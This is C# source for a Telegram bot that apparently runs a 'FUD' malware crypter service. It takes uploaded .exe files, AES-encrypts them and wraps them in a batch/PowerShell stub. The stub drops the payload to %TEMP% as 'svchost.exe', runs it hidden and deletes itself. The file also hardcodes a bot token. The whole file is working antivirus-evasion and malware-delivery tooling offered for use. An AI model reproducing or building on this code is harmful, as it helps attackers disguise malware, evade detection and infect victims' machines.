var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/", () => "🟢 v7.4 ALIVE");
app.MapGet("/debug", () => DateTime.Now.ToString());

app.MapPost("/webhook", async (HttpContext ctx) =>
{
    var log = $"[{DateTime.Now:HH:mm:ss}] POST RECEIVED\n";
    await File.AppendAllTextAsync("log.txt", log);
    
    using var reader = new StreamReader(ctx.Request.Body);
    string body = await reader.ReadToEndAsync();
    await File.AppendAllTextAsync("log.txt", $"BODY: {body}\n");
    
    // IMMEDIATE RESPONSE - NO WAIT
    ctx.Response.StatusCode = 200;
    await ctx.Response.WriteAsync("OK");
    
    // FIRE & FORGET PROCESSING
    _ = Task.Run(async () => await ProcessWebhook(body));
    
    return;
});

static async Task ProcessWebhook(string body)
{
    try 
    {
        await File.AppendAllTextAsync("log.txt", "PROCESSING...\n");
        
        // PARSE JSON
        using var doc = JsonDocument.Parse(body);
        var message = doc.RootElement.GetProperty("message");
        
        long chatId = message.GetProperty("chat").GetProperty("id").GetInt64();
        await File.AppendAllTextAsync("log.txt", $"ChatID: {chatId}\n");
        
        if (message.TryGetProperty("document", out var docEl))
        {
            string fileName = docEl.GetProperty("file_name").GetString()!;
            await File.AppendAllTextAsync("log.txt", $"File: {fileName}\n");
            
            if (fileName.EndsWith(".exe"))
            {
                string fileId = docEl.GetProperty("file_id").GetString()!;
                await ProcessExe(chatId, fileId);
            }
        }
    }
    catch (Exception ex) 
    {
        await File.AppendAllTextAsync("log.txt", $"ERROR: {ex}\n");
    }
}

static async Task ProcessExe(long chatId, string fileId)
{
    await File.AppendAllTextAsync("log.txt", "EXE DETECTED - DOWNLOADING\n");
    
    // DOWNLOAD EXE
    using var http = new HttpClient();
    string url = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{await GetFilePath(fileId, http)}";
    byte[] exeBytes = await http.GetByteArrayAsync(url);
    await File.AppendAllTextAsync("log.txt", $"EXE SIZE: {exeBytes.Length}\n");
    
    // ENCRYPT
    byte[] encrypted = SimpleEncrypt(exeBytes);
    string b64 = Convert.ToBase64String(encrypted);
    
    // BUILD BAT
    string batPayload = BuildPayload(b64);
    byte[] fudBytes = Encoding.UTF8.GetBytes(batPayload);
    
    // SEND BACK
    await SendFile(chatId, fudBytes, "fud-v7.4.exe");
}

static string BuildPayload(string b64)
{
    string ps1 = $@"
$key = [Text.Encoding]::ASCII.GetBytes('FUDKEY12345678901234567890123456');
$bytes = [Convert]::FromBase64String('{b64}');
$aes = [System.Security.Cryptography.Aes]::Create();
$aes.Key = $key;
$aes.IV = [byte[]](1..16);
$decrypt = $aes.CreateDecryptor();
$ms = New-Object IO.MemoryStream($bytes);
$cs = New-Object IO.CryptoStream($ms,$decrypt,[IO.CryptoStreamMode]::Read);
$outfile = [IO.Path]::Combine($env:TEMP,'svchost.exe');
$fs = New-Object IO.FileStream($outfile,'Create');
$cs.CopyTo($fs);
$cs.Close(); $fs.Close();
Start-Process $outfile -WindowStyle Hidden
";
    
    return $"@echo off{Environment.NewLine}" +
           $"powershell -nop -w hidden -c \"{ps1.Replace("\"", "\\\"")}\"{Environment.NewLine}" +
           $"timeout /t 3 /nobreak >nul & del /f /q %0";
}

static byte[] SimpleEncrypt(byte[] data)
{
    using var aes = Aes.Create();
    aes.Key = Encoding.ASCII.GetBytes("FUDKEY12345678901234567890123456");
    aes.IV = new byte[16];
    using var encryptor = aes.CreateEncryptor();
    using var ms = new MemoryStream();
    using var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);
    cs.Write(data, 0, data.Length);
    cs.FlushFinalBlock();
    return ms.ToArray();
}

static async Task<string> GetFilePath(string fileId, HttpClient http)
{
    string resp = await http.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={fileId}");
    using var doc = JsonDocument.Parse(resp);
    return doc.RootElement.GetProperty("result").GetProperty("file_path").GetString();
}

static async Task SendFile(long chatId, byte[] file, string name)
{
    using var http = new HttpClient();
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(file), "document", name);
    form.Add(new StringContent("🔥 FUD v7.4 READY"), "caption");
    
    await http.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", form);
    await File.AppendAllTextAsync("log.txt", "FUD SENT ✅\n");
}

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

app.Run();
